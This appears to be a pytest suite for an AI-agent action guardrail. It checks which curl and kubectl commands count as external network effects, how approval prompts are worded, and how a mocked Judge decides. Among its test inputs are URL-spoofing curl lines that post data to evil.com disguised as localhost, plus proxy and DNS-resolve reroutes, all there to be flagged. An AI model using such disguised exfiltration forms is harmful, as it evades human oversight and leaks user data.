"""Local network calls, approval card wording and the relaxed Judge rule.

Regression based on a captured balanced-profile failure; identifiers removed.
Model answers are fixtures; no paid calls.
"""

import json
from unittest.mock import Mock

import pytest

from intaris import judge_simulator as simulator
from intaris.effect_scope import external_action, external_reason
from intaris.hybrid import evaluate_policy
from intaris.hybrid_runtime import _observe_action
from intaris.policy_evidence import from_observations
from tests.test_policy_evidence_runtime import response
from tests.test_policy_evidence_runtime import runtime as runtime

PRODUCTION = (
    "kubectl -n example-monitoring port-forward svc/log-reader 19000:80 >/tmp/example-pf.log 2>&1 & "
    "PF=$!; sleep 3; curl -sG http://127.0.0.1:19000/loki/api/v1/query_range "
    "--data-urlencode 'query={namespace=\"example-app\"}' --data-urlencode 'limit=50'; "
    "kill $PF"
)
PRODUCTION_QUESTION = (
    "Shall I execute the provided bash command to query the Loki logs?"
)
REMOTE_POST = "curl -d @f https://api.example.com/v1/items"


# --- 1. Local network calls are not external effects -----------------------


@pytest.mark.parametrize(
    "command,external",
    [
        (PRODUCTION, False),
        ("kubectl -n example-monitoring port-forward svc/log-reader 19000:80", False),
        ("curl -d x http://localhost:8080/api", False),
        ("curl --data=x http://[::1]:9000/a", False),
        (
            "curl -X POST http://log-reader.example-monitoring.svc.cluster.local/x",
            False,
        ),
        ("curl -d x --url http://logs.example-monitoring.svc/x", False),
        # Remote semantics are unchanged: a plain GET is a read.
        ("curl https://example.com", False),
        ("curl -d @f https://api.x", True),
        (REMOTE_POST, True),
        # Mixed local and remote targets stay external.
        ("curl -d x http://127.0.0.1/a https://api.x/b", True),
        (
            "curl -sG http://127.0.0.1:1/x --data-urlencode q=1; curl -d @f https://api.x",
            True,
        ),
        # Undeterminable or rerouted destinations stay external.
        ("curl -d x $URL", True),
        ("curl -d x", True),
        ("curl -x http://proxy.example.com:3128 -d x http://localhost/a", True),
        ("curl --resolve localhost:80:203.0.113.1 -d x http://localhost/a", True),
        ("curl -d x --url https://api.x", True),
        ("curl -d x http://localhost.evil.com/a", True),
        ("curl -d x http://127.0.0.1@evil.com/a", True),
        # Ordinary option values are not targets.
        ("curl --retry-delay 2 -d x http://127.0.0.1:31100/api", False),
        ("curl --retry-max-time 9 --limit-rate 1M -d x http://localhost/a", False),
        ("curl --silent -d x localhost:8080/a", False),
        # After an unknown option the next token may be a target: conservative.
        ("curl --some-new-option 5 -d x http://localhost/a", True),
        ("curl -d x --retry-all-errors example.com http://localhost/api", True),
        ("curl -d x --ipv4 example.com http://localhost/api", True),
        ("curl --retry-delay 2 -d x https://api.x/a", True),
        ("curl --some-new-option 5 -d x https://api.x/a", True),
        ("curl --some-new-option https://api.x -d x http://localhost/a", True),
    ],
)
def test_local_network_targets_are_not_external(command, external):
    assert external_action("bash", {"command": command}) is external


def test_production_command_needs_no_explicit_grant():
    facts = _observe_action("bash", {"command": PRODUCTION}, policy={})
    assert not facts["external_or_irreversible"]
    state = from_observations(facts).model_copy(
        update={
            "assessment": {
                "relationship": "supports_intent",
                "risk": "low",
                "mutation": "read_only",
                "effects": ["read", "execute"],
                "contextual_restrictions": "consistent",
                "authorization": "implicit",
            }
        }
    )
    result = evaluate_policy([], state, "balanced", assessed=True)
    assert "authority.external" not in {o.id for o in result.outstanding_obligations}


# --- 2. Approval card wording ----------------------------------------------


def ask_answer(question=PRODUCTION_QUESTION, basis="missing_permission"):
    return simulator.Answer(
        user_would="ask",
        risk="low",
        confidence="medium",
        basis=basis,
        cites=[],
        question=question,
    )


def test_external_trigger_names_tool_destination_and_intaris_voice():
    text = simulator.user_explanation(
        ask_answer(),
        {"status": "ready"},
        "escalate",
        {"tool": "bash", "args_redacted": {"command": REMOTE_POST}},
        triggers=["authority.external"],
    )
    assert text == (
        "This bash command sends a network request to api.example.com, which "
        "needs your approval. Approve the request to execute the provided bash "
        "command to query the Loki logs?"
    )
    for label in ("Permission for this action", "Shall I", "basis=", "cites="):
        assert label not in text
    assert "User simulator" not in text


def test_production_text_without_visible_host_still_names_the_trigger():
    text = simulator.user_explanation(
        ask_answer(),
        {"status": "ready"},
        "escalate",
        {"tool": "bash", "args_redacted": {"command": PRODUCTION}},
        triggers=["authority.external"],
    )
    assert text.startswith(
        "This bash command may have an external or irreversible effect, which "
        "needs your approval."
    )
    assert "Approve the request to execute the provided bash command" in text
    assert "Shall I" not in text


@pytest.mark.parametrize(
    "question,expected",
    [
        ("Should I push the branch?", "Approve the request to push the branch?"),
        (
            "Do you want me to send my draft?",
            "Approve the request to send the agent's draft?",
        ),
        ("Is the grep search needed?", "Is the grep search needed?"),
        ("Shall I?", ""),
    ],
)
def test_agent_voice_is_rewritten(question, expected):
    assert simulator.intaris_question(question) == expected


def test_agent_voice_question_dropped_when_nothing_remains():
    text = simulator.user_explanation(
        ask_answer("Shall I?"),
        {},
        "escalate",
        {"tool": "bash", "args_redacted": {"command": REMOTE_POST}},
        triggers=["authority.external"],
    )
    assert text == (
        "This bash command sends a network request to api.example.com, which "
        "needs your approval."
    )


def test_internal_labels_are_still_removed():
    text = simulator.user_explanation(
        ask_answer("User simulator: Shall I run it? basis=outside_task cites=1"),
        {},
        "escalate",
        {"tool": "bash", "args_redacted": {}},
    )
    for label in ("basis", "cites", "User simulator", "Shall I"):
        assert label not in text


def test_external_reason_never_echoes_unsafe_host_text():
    reason = external_reason("bash", {"command": "curl -d x https://ex<am>ple.com"})
    assert "<" not in reason


def implicit_l1(kwargs):
    """L1 fixture: supports the task without explicit user authorization."""
    value = json.loads(response(kwargs))
    target = value.get("classification", value)
    overrides = dict(
        authorization="implicit",
        authorization_scope="unclear",
        authorization_source="none",
        effects=["read", "execute"],
        mutation="read_only",
    )
    target.update({k: v for k, v in overrides.items() if k in target})
    return json.dumps(value)


def test_runtime_external_escalation_names_trigger(runtime):  # noqa: F811
    sessions, audit, llm, evaluator, session_id = runtime
    sessions.update_session(session_id, user_id="owner", policy={"profile": "balanced"})
    llm.generate.side_effect = lambda *args, **kwargs: implicit_l1(kwargs)
    result = evaluator.evaluate(
        user_id="owner",
        session_id=session_id,
        agent_id=None,
        tool="bash",
        args={"command": REMOTE_POST},
    )
    assert result["decision"] == "approve"
    record = audit.get_by_call_id(result["call_id"], user_id="owner")
    assert not record["evaluation_metadata"]["judge_required"]
    # The production command reaches no external obligation at all.
    local = evaluator.evaluate(
        user_id="owner",
        session_id=session_id,
        agent_id=None,
        tool="bash",
        args={"command": PRODUCTION},
    )
    assert local["decision"] == "approve"


# --- 4. Relaxed Judge decision rule ----------------------------------------


def external_state(command=REMOTE_POST, **assessment):
    facts = _observe_action("bash", {"command": command}, policy={})
    assert facts["external_or_irreversible"]
    return from_observations(facts).model_copy(
        update={
            "assessment": {
                "relationship": "supports_intent",
                "risk": "low",
                "contextual_restrictions": "consistent",
                "authorization": "implicit",
                **assessment,
            }
        }
    )


def user_source(text, ref="latest_user_message"):
    return {
        "originals": [
            {
                "ref": ref,
                "content": text,
                "origin": "client_user_claim",
                "truncated": False,
            }
        ],
        "items": [],
    }


def judge_question(
    profile, state, artifact, *, intention="", latest_assistant="", tool="bash"
):
    return simulator.request(
        {"tool": tool, "args_redacted": {"command": REMOTE_POST}},
        {"intention": intention, "policy": {"profile": profile}},
        state,
        evaluate_policy([], state, profile, assessed=True),
        artifact,
        latest_assistant=latest_assistant,
    )


def judge(judge_input, **answer):
    value = dict(
        user_would="approve",
        risk="low",
        confidence="high",
        basis="routine_within_task",
        cites=[1],
        question="",
        action_summary="Perform the specific proposed network action",
        explanation="Assess the actual request, recipient and effect against the supplied instructions.",
        restriction_quote="",
    )
    value.update(answer)
    llm = Mock(generate=Mock(return_value=json.dumps(value)))
    return simulator.classify(llm, judge_input)


def final_outcome(profile, state, question, answer):
    result = evaluate_policy([], state, profile, assessed=True)
    review = simulator.receipt(state, result, answer, question["citable"])
    reviewed = state.model_copy(update={"review": review})
    return evaluate_policy([], reviewed, profile, assessed=True).outcome


def test_balanced_covered_external_curl_is_approved_without_downgrade():
    state = external_state()
    prior = evaluate_policy([], state, "balanced", assessed=True)
    assert prior.outcome == "approve"
    question = judge_question(
        "balanced",
        state,
        user_source("Post the item file to the api.example.com items endpoint."),
    )
    basis = question["schema"]["schema"]["properties"]["basis"]["enum"]
    assert "missing_permission" not in basis
    answer, diagnostics = judge(question)
    assert answer.user_would == "approve"
    assert diagnostics["downgrade_reason"] is None
    assert final_outcome("balanced", state, question, answer) == "approve"
    receipt = simulator.receipt(
        state,
        prior,
        answer,
        question["citable"],
    )
    assert (
        evaluate_policy(
            [], state.model_copy(update={"review": receipt}), "balanced", assessed=True
        ).outcome
        == "approve"
    )


def test_balanced_different_recipient_escalates():
    state = external_state(target_scope="conflicts", target_reference="action")
    question = judge_question(
        "balanced",
        state,
        user_source("Send the draft to alice@example.com."),
        latest_assistant="I drafted the message to alice@example.com.",
    )
    contract = question["messages"][0]["content"]
    assert "target compatibility" in contract
    answer, _ = judge(
        question,
        user_would="ask",
        basis="outside_task",
        question="Should I send it to bob@example.com instead?",
    )
    assert answer.user_would == "ask"
    assert final_outcome("balanced", state, question, answer) == "escalate"


def test_balanced_bare_yes_without_proposal_is_not_approved():
    # Golden negative n-bare-yes: external send, user said only "yes" and the
    # agent proposed nothing.
    state = external_state()
    question = judge_question(
        "balanced",
        state,
        user_source("yes"),
        intention="Review the inbox",
        latest_assistant="Here are the search results.",
    )
    assert question["citable"][1] == "latest_user_message"
    answer, diagnostics = judge(question, basis="explicit_request", cites=[1])
    receipt = simulator.receipt(
        state, evaluate_policy([], state), answer, question["citable"]
    )
    assert not receipt.evidence_refs or receipt.corrected_assessment is None
    # An advisory vote or citation alone never becomes user authorization.
    assert state.value("authorization") == "implicit"
    assert state.sources == {}


@pytest.mark.parametrize(
    "agent_message",
    [
        "Shall I post the item file to api.example.com?",
        "I propose posting the item file to api.example.com. Please confirm.",
    ],
)
def test_balanced_bare_yes_to_an_agent_proposal_is_coverage(agent_message):
    state = external_state()
    question = judge_question(
        "balanced", state, user_source("yes"), latest_assistant=agent_message
    )
    answer, diagnostics = judge(question, basis="explicit_request", cites=[1])
    assert answer.user_would == "approve"
    assert diagnostics["downgrade_reason"] is None


def test_balanced_bare_yes_to_an_unrelated_question_is_not_coverage():
    state = external_state()
    question = judge_question(
        "balanced",
        state,
        user_source("yes"),
        intention="Review the inbox",
        latest_assistant="Here are the search results. Anything else?",
    )
    answer, diagnostics = judge(question, basis="explicit_request", cites=[1])
    receipt = simulator.receipt(
        state, evaluate_policy([], state), answer, question["citable"]
    )
    assert receipt.corrected_assessment is None
    assert state.sources == {}


def test_external_trigger_keeps_other_material_concerns(runtime):  # noqa: F811
    sessions, audit, llm, evaluator, session_id = runtime
    sessions.update_session(session_id, user_id="owner", policy={"profile": "balanced"})

    def conflicting(kwargs):
        value = json.loads(implicit_l1(kwargs))
        target = value.get("classification", value)
        if "contextual_restrictions" in target:
            target["contextual_restrictions"] = "conflicts"
        return json.dumps(value)

    llm.generate.side_effect = lambda *args, **kwargs: conflicting(kwargs)
    result = evaluator.evaluate(
        user_id="owner",
        session_id=session_id,
        agent_id=None,
        tool="bash",
        args={"command": REMOTE_POST},
    )
    assert result["decision"] == "escalate"
    reasoning = audit.get_by_call_id(result["call_id"], user_id="owner")["reasoning"]
    assert reasoning.startswith(
        "The evaluator found an intention, target or restriction conflict"
    )
    assert "found a conflict with a task restriction" in reasoning


def test_strict_common_assessor_has_no_citation_personality():
    state = external_state()
    question = judge_question("strict", state, user_source("yes"))
    basis = question["schema"]["schema"]["properties"]["basis"]["enum"]
    assert "missing_permission" not in basis
    answer, diagnostics = judge(question, cites=[])
    assert (answer.user_would, diagnostics["downgrade_reason"]) == (
        "approve",
        None,
    )
    # Strict keeps its cited-evidence rule, not the balanced coverage rule.
    assert judge(question, basis="explicit_request")[0].user_would == "approve"


@pytest.mark.parametrize("risk", ["low", "medium"])
def test_bounded_reasoned_approval_is_never_downgraded_to_ask(risk):
    state = external_state(risk=risk)
    question = judge_question("bounded_autonomy", state, user_source("yes"))
    invalid = json.dumps(
        dict(
            user_would="approve",
            risk=risk,
            confidence="medium",
            basis="missing_permission",
            cites=[],
            question="",
            action_summary="Perform the proposed network request",
            explanation="Assess its actual recipient, payload and effect.",
            restriction_quote="",
        )
    )
    llm = Mock(generate=Mock(side_effect=[invalid, invalid]))
    answer, diagnostics = simulator.classify(llm, question)
    assert diagnostics["downgrade_reason"] == "invalid_basis"
    assert answer.user_would == "ask"
    for cites in ([], [1]):
        assert judge(question, cites=cites, risk=risk)[0].user_would == "approve"
